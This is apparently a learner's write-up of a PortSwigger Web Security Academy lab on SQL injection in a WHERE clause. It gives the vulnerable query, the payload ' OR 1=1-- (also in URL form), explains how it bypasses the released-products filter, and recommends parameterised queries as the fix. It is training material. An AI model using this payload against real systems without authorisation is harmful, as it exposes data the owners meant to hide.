# Lab 14 — SQL Injection in WHERE Clause
**Date:** June 3, 2026
**Platform:** PortSwigger Web Security Academy
**Difficulty:** Apprentice

## What it is
User input passed directly into a SQL WHERE clause without sanitisation — allowing extra conditions to be injected.

## The vulnerable query
```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

## Payload used
`' OR 1=1--`

## What it did to the query
```sql
SELECT * FROM products WHERE category = '' OR 1=1--' AND released = 1
```
- `'` — closed the category string early
- `OR 1=1` — condition always true, returns every row
- `--` — comments out the rest of the query including `AND released = 1`

## How I did it
- Found the category filter in the URL — `?category=Gifts`
- Replaced `Gifts` with `'+OR+1=1--` in the address bar
- All products returned including unreleased ones

## Key lesson
Never build SQL queries by concatenating user input directly. The database cannot distinguish between the developer's SQL and the attacker's injected SQL.

## Fix
Use parameterised queries (prepared statements) — these separate the SQL code from the data so injected SQL is always treated as plain text, never as executable code.
